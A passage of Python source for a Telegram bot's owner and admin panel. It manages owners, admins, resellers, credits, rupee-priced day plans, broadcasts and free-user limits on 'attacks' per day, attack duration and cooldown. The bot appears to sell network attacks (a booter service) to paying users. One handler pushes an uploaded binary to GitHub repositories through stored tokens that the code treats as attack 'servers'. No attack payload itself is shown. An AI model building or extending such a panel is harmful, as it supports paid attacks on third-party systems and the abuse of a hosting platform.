        [InlineKeyboardButton(bold("❌ 𝐂𝐚𝐧𝐜𝐞𝐥"), callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"⏱️ {bold('𝐒𝐄𝐓 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧')}: {COOLDOWN_DURATION}s\n\n"
        f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐧𝐞𝐰 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧')}:\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def admin_list(update: Update, user_id):
    """Show admin list"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    if not admins:
        await update.message.reply_text(f"📭 {bold('𝐍𝐎 𝐀𝐃𝐌𝐈𝐍𝐒 𝐀𝐃𝐃𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    admin_list_text = f"🛡️ {bold('𝐀𝐃𝐌𝐈𝐍𝐒 𝐋𝐈𝐒𝐓')}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for admin_id, admin_info in admins.items():
        username = admin_info.get('username', f'admin_{admin_id}')
        admin_list_text += f"• `{admin_id}` - @{username}\n"

    admin_list_text += f"\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    await update.message.reply_text(admin_list_text)

# ==================== OWNER PANEL ====================
async def show_owner_panel(update: Update, user_id):
    """Show owner panel"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    message = (
        f"👑 {bold('𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐎𝐰𝐧𝐞𝐫-𝐨𝐧𝐥𝐲 𝐦𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭 𝐨𝐩𝐭𝐢𝐨𝐧𝐬')}\n\n"
        f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧 𝐛𝐞𝐥𝐨𝐰')}:\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )

    reply_markup = get_owner_panel_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

async def add_owner_start(update: Update, user_id):
    """Start add owner process"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    temp_data[user_id] = {"step": "owner_add_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"👑 {bold('𝐀𝐃𝐃 𝐎𝐖𝐍𝐄𝐑')} - {bold('𝐒𝐓𝐄𝐏 𝟏/𝟐')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐔𝐬𝐞𝐫 𝐈𝐃')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `123456789`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def remove_owner_start(update: Update, user_id):
    """Start remove owner process"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    temp_data[user_id] = {"step": "owner_remove_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"🗑️ {bold('𝐑𝐄𝐌𝐎𝐕𝐄 𝐎𝐖𝐍𝐄𝐑')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐔𝐬𝐞𝐫 𝐈𝐃')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `123456789`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def add_reseller_start(update: Update, user_id):
    """Start add reseller process"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    temp_data[user_id] = {"step": "reseller_add_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"💰 {bold('𝐀𝐃𝐃 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑')} - {bold('𝐒𝐓𝐄𝐏 𝟏/𝟑')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐔𝐬𝐞𝐫 𝐈𝐃')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `123456789`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def remove_reseller_start(update: Update, user_id):
    """Start remove reseller process"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    temp_data[user_id] = {"step": "reseller_remove_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"🗑️ {bold('𝐑𝐄𝐌𝐎𝐕𝐄 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐔𝐬𝐞𝐫 𝐈𝐃 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `123456789`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def owner_list(update: Update, user_id):
    """Show owners list"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    owners_list = f"👑 {bold('𝐎𝐖𝐍𝐄𝐑𝐒 𝐋𝐈𝐒𝐓')}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for owner_id, owner_info in owners.items():
        username = owner_info.get('username', f'owner_{owner_id}')
        is_primary = owner_info.get('is_primary', False)
        added_by = owner_info.get('added_by', 'system')
        owners_list += f"• `{owner_id}` - @{username}"
        if is_primary:
            owners_list += f" 👑 {bold('(𝐏𝐑𝐈𝐌𝐀𝐑𝐘)')}"
        owners_list += f"\n  {bold('𝐀𝐝𝐝𝐞𝐝 𝐛𝐲')}: `{added_by}`\n"

    owners_list += f"\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    await update.message.reply_text(owners_list)

async def reseller_list(update: Update, user_id):
    """Show resellers list"""
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    if not resellers:
        await update.message.reply_text(f"📭 {bold('𝐍𝐎 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑𝐒')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    resellers_list = f"💰 {bold('𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑𝐒 𝐋𝐈𝐒𝐓')}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for reseller_id, reseller_info in resellers.items():
        username = reseller_info.get('username', f'reseller_{reseller_id}')
        credits = reseller_info.get('credits', 0)
        users_added = reseller_info.get('total_added', 0)
        expiry = reseller_info.get('expiry', '?')
        if expiry != '𝐋𝐈𝐅𝐄𝐓𝐈𝐌𝐄':
            try:
                expiry_time = float(expiry)
                expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                expiry = expiry_date
            except:
                pass
        resellers_list += f"• `{reseller_id}` - @{username}\n  {bold('𝐂𝐫𝐞𝐝𝐢𝐭𝐬')}: {credits} | {bold('𝐔𝐬𝐞𝐫𝐬 𝐀𝐝𝐝𝐞𝐝')}: {users_added} | {bold('𝐄𝐱𝐩𝐢𝐫𝐲')}: {expiry}\n"

    resellers_list += f"\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    await update.message.reply_text(resellers_list)

async def broadcast_start(update: Update, user_id):
    """Start broadcast process"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    temp_data[user_id] = {"step": "broadcast_message"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"📢 {bold('𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐌𝐄𝐒𝐒𝐀𝐆𝐄')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐛𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭')}:\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def upload_binary_start(update: Update, user_id):
    """Start binary upload process"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    if not github_tokens:
        await update.message.reply_text(f"❌ {bold('𝐍𝐎 𝐒𝐄𝐑𝐕𝐄𝐑𝐒 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄')}\n{bold('𝐍𝐨 𝐬𝐞𝐫𝐯𝐞𝐫𝐬 𝐚𝐝𝐝𝐞𝐝')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    temp_data[user_id] = {"step": "binary_upload"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"📤 {bold('𝐁𝐈𝐍𝐀𝐑𝐘 𝐔𝐏𝐋𝐎𝐀𝐃')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐲𝐨𝐮𝐫 𝐛𝐢𝐧𝐚𝐫𝐲 𝐟𝐢𝐥𝐞')}...\n"
        f"{bold('𝐈𝐭 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐮𝐩𝐥𝐨𝐚𝐝𝐞𝐝 𝐭𝐨 𝐚𝐥𝐥 𝐆𝐢𝐭𝐇𝐮𝐛 𝐫𝐞𝐩𝐨𝐬')}.\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def add_reseller_credits_start(update: Update, user_id):
    """Start add reseller credits process"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    temp_data[user_id] = {"step": "add_reseller_credits_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"💰 {bold('𝐀𝐃𝐃 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐂𝐑𝐄𝐃𝐈𝐓𝐒')} - {bold('𝐒𝐓𝐄𝐏 𝟏/𝟐')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐔𝐬𝐞𝐫 𝐈𝐃')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `123456789`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def reseller_stats(update: Update, user_id):
    """Show reseller statistics"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    if not resellers:
        await update.message.reply_text(f"📭 {bold('𝐍𝐎 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑𝐒')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    stats = f"💰 {bold('𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐂𝐒')}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    total_credits = 0
    total_users_added = 0
    
    for reseller_id, reseller_info in resellers.items():
        username = reseller_info.get('username', f'reseller_{reseller_id}')
        credits = reseller_info.get('credits', 0)
        users_added = reseller_info.get('total_added', 0)
        total_credits += credits
        total_users_added += users_added
        stats += f"• @{username} (`{reseller_id}`)\n  {bold('𝐂𝐫𝐞𝐝𝐢𝐭𝐬')}: {credits} | {bold('𝐔𝐬𝐞𝐫𝐬 𝐀𝐝𝐝𝐞𝐝')}: {users_added}\n\n"

    stats += f"📊 {bold('𝐓𝐨𝐭𝐚𝐥 𝐂𝐫𝐞𝐝𝐢𝐭𝐬')}: {total_credits}\n"
    stats += f"👥 {bold('𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬 𝐀𝐝𝐝𝐞𝐝')}: {total_users_added}\n"
    stats += f"💰 {bold('𝐓𝐨𝐭𝐚𝐥 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬')}: {len(resellers)}\n\n"
    stats += f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    
    await update.message.reply_text(stats)

# ==================== PRICE MANAGEMENT ====================
async def show_price_management(update: Update, user_id):
    """Show price management menu"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    message = (
        f"💰 {bold('𝐏𝐑𝐈𝐂𝐄 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐏𝐫𝐢𝐜𝐞𝐬')}:\n\n"
        f"{bold('𝐔𝐬𝐞𝐫')}:\n"
        f"  𝟏𝐝: ₹{prices['user']['1']} | 𝟐𝐝: ₹{prices['user']['2']} | 𝟑𝐝: ₹{prices['user']['3']}\n"
        f"  𝟒𝐝: ₹{prices['user']['4']} | 𝟕𝐝: ₹{prices['user']['7']}\n\n"
        f"{bold('𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫')}:\n"
        f"  𝟏𝐝: ₹{prices['reseller']['1']} | 𝟐𝐝: ₹{prices['reseller']['2']} | 𝟑𝐝: ₹{prices['reseller']['3']}\n"
        f"  𝟒𝐝: ₹{prices['reseller']['4']} | 𝟕𝐝: ₹{prices['reseller']['7']}\n\n"
        f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧')}:"
    )

    reply_markup = get_price_management_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

async def edit_user_prices(update: Update, user_id):
    """Edit user prices"""
    if not is_owner(user_id):
        return

    keyboard = [
        [InlineKeyboardButton(bold("𝟏 𝐃𝐚𝐲"), callback_data="edit_user_1"),
         InlineKeyboardButton(bold("𝟐 𝐃𝐚𝐲𝐬"), callback_data="edit_user_2"),
         InlineKeyboardButton(bold("𝟑 𝐃𝐚𝐲𝐬"), callback_data="edit_user_3")],
        [InlineKeyboardButton(bold("𝟒 𝐃𝐚𝐲𝐬"), callback_data="edit_user_4"),
         InlineKeyboardButton(bold("𝟕 𝐃𝐚𝐲𝐬"), callback_data="edit_user_7"),
         InlineKeyboardButton(bold("❌ 𝐂𝐚𝐧𝐜𝐞𝐥"), callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    temp_data[user_id] = {"step": "edit_user_price"}
    await update.message.reply_text(
        f"👤 {bold('𝐄𝐃𝐈𝐓 𝐔𝐒𝐄𝐑 𝐏𝐑𝐈𝐂𝐄𝐒')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐭𝐨 𝐞𝐝𝐢𝐭')}:",
        reply_markup=reply_markup
    )

async def edit_reseller_prices(update: Update, user_id):
    """Edit reseller prices"""
    if not is_owner(user_id):
        return

    keyboard = [
        [InlineKeyboardButton(bold("𝟏 𝐃𝐚𝐲"), callback_data="edit_reseller_1"),
         InlineKeyboardButton(bold("𝟐 𝐃𝐚𝐲𝐬"), callback_data="edit_reseller_2"),
         InlineKeyboardButton(bold("𝟑 𝐃𝐚𝐲𝐬"), callback_data="edit_reseller_3")],
        [InlineKeyboardButton(bold("𝟒 𝐃𝐚𝐲𝐬"), callback_data="edit_reseller_4"),
         InlineKeyboardButton(bold("𝟕 𝐃𝐚𝐲𝐬"), callback_data="edit_reseller_7"),
         InlineKeyboardButton(bold("❌ 𝐂𝐚𝐧𝐜𝐞𝐥"), callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    temp_data[user_id] = {"step": "edit_reseller_price"}
    await update.message.reply_text(
        f"💰 {bold('𝐄𝐃𝐈𝐓 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐑𝐈𝐂𝐄𝐒')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐭𝐨 𝐞𝐝𝐢𝐭')}:",
        reply_markup=reply_markup
    )

# ==================== FREE CONTROLS ====================
async def show_free_controls(update: Update, user_id):
    """Show free user controls menu"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    message = (
        f"🆓 {bold('𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐂𝐎𝐍𝐓𝐑𝐎𝐋𝐒')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱️ {bold('𝐌𝐚𝐱 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧')}: {free_settings['max_duration']}s\n"
        f"🔄 {bold('𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧')}: {free_settings['cooldown']}s\n"
        f"📊 {bold('𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐬/𝐃𝐚𝐲')}: {free_settings['max_attacks_per_day']}\n"
        f"👥 {bold('𝐅𝐫𝐞𝐞 𝐆𝐫𝐨𝐮𝐩 𝐈𝐃')}: {free_settings['free_group_id']}\n"
        f"💬 {bold('𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝')}: {'𝐘𝐞𝐬' if free_settings['feedback_required'] else '𝐍𝐨'}\n\n"
        f"{bold('𝐒𝐞𝐥𝐞𝐜𝐭 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧')}:"
    )

    reply_markup = get_free_controls_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

async def set_free_duration_start(update: Update, user_id):
    """Start set free max duration"""
    if not is_owner(user_id):
        return

    temp_data[user_id] = {"step": "set_free_duration"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"⏱️ {bold('𝐒𝐄𝐓 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐂𝐮𝐫𝐫𝐞𝐧𝐭')}: {free_settings['max_duration']}s\n\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐧𝐞𝐰 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐢𝐧 𝐬𝐞𝐜𝐨𝐧𝐝𝐬')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `60`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def set_free_cooldown_start(update: Update, user_id):
    """Start set free cooldown"""
    if not is_owner(user_id):
        return

    temp_data[user_id] = {"step": "set_free_cooldown"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"🔄 {bold('𝐒𝐄𝐓 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐂𝐮𝐫𝐫𝐞𝐧𝐭')}: {free_settings['cooldown']}s\n\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐧𝐞𝐰 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐢𝐧 𝐬𝐞𝐜𝐨𝐧𝐝𝐬')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `300`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def set_free_limit_start(update: Update, user_id):
    """Start set free daily limit"""
    if not is_owner(user_id):
        return

    temp_data[user_id] = {"step": "set_free_limit"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"📊 {bold('𝐒𝐄𝐓 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐃𝐀𝐈𝐋𝐘 𝐋𝐈𝐌𝐈𝐓')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐂𝐮𝐫𝐫𝐞𝐧𝐭')}: {free_settings['max_attacks_per_day']} 𝐚𝐭𝐭𝐚𝐜𝐤𝐬/𝐝𝐚𝐲\n\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐧𝐞𝐰 𝐥𝐢𝐦𝐢𝐭')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `5`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def set_free_group_id_start(update: Update, user_id):
    """Start set free group ID"""
    if not is_owner(user_id):
        return

    temp_data[user_id] = {"step": "set_free_group_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"👥 {bold('𝐒𝐄𝐓 𝐅𝐑𝐄𝐄 𝐆𝐑𝐎𝐔𝐏 𝐈𝐃')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐂𝐮𝐫𝐫𝐞𝐧𝐭')}: {free_settings['free_group_id']}\n\n"
        f"{bold('𝐒𝐞𝐧𝐝 𝐧𝐞𝐰 𝐠𝐫𝐨𝐮𝐩 𝐈𝐃')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `-100123456789`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def toggle_free_feedback(update: Update, user_id):
    """Toggle free user feedback requirement"""
    if not is_owner(user_id):
        return

    free_settings["feedback_required"] = not free_settings["feedback_required"]
    save_free_settings(free_settings)

    await update.message.reply_text(
        f"✅ {bold('𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐌𝐄𝐍𝐓')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐍𝐞𝐰 𝐬𝐭𝐚𝐭𝐮𝐬')}: {'𝐘𝐞𝐬' if free_settings['feedback_required'] else '𝐍𝐨'}\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )

async def free_stats(update: Update, user_id):
    """Show free user statistics"""
    if not is_owner(user_id):
        return

    total_free_users = len([uid for uid in user_server if user_server[uid] == "FREE"])
    today = time.strftime("%Y-%m-%d")
    today_attacks = 0
    
    for uid, counts in free_user_attack_counts.items():
        if today in counts:
            today_attacks += counts[today]
    
    total_referrals = len(referrals)
    total_keys = sum(r["keys_generated"] for r in referrals.values())
    
    message = (
        f"📊 {bold('𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐂𝐒')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 {bold('𝐓𝐨𝐭𝐚𝐥 𝐅𝐫𝐞𝐞 𝐔𝐬𝐞𝐫𝐬')}: {total_free_users}\n"
        f"📊 {bold('𝐓𝐨𝐝𝐚𝐲𝐬 𝐀𝐭𝐭𝐚𝐜𝐤𝐬')}: {today_attacks}\n"
        f"🔗 {bold('𝐓𝐨𝐭𝐚𝐥 𝐑𝐞𝐟𝐞𝐫𝐫𝐚𝐥𝐬')}: {total_referrals}\n"
        f"🔑 {bold('𝐊𝐞𝐲𝐬 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝')}: {total_keys}\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )
    
    await update.message.reply_text(message)

# ==================== LINK SETTINGS (FIXED) ====================
async def show_link_settings(update: Update, user_id):
    """Show link settings menu"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    message = (
        f"🔗 {bold('𝐋𝐈𝐍𝐊 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📢 {bold('𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥')}:\n"
        f"  {bold('𝐍𝐚𝐦𝐞')}: {links_config['channels'][0]['name']}\n"
        f"  {bold('𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}: {links_config['channels'][0]['username']}\n"
        f"  {bold('𝐋𝐢𝐧𝐤')}: {links_config['channels'][0]['invite_link']}\n\n"
        f"📢 {bold('𝐏𝐮𝐛𝐥𝐢𝐜 𝐂𝐡𝐚𝐧𝐧𝐞𝐥')}:\n"
        f"  {bold('𝐍𝐚𝐦𝐞')}: {links_config['channels'][1]['name']}\n"
        f"  {bold('𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}: {links_config['channels'][1]['username']}\n"
        f"  {bold('𝐋𝐢𝐧𝐤')}: {links_config['channels'][1]['link']}\n\n"
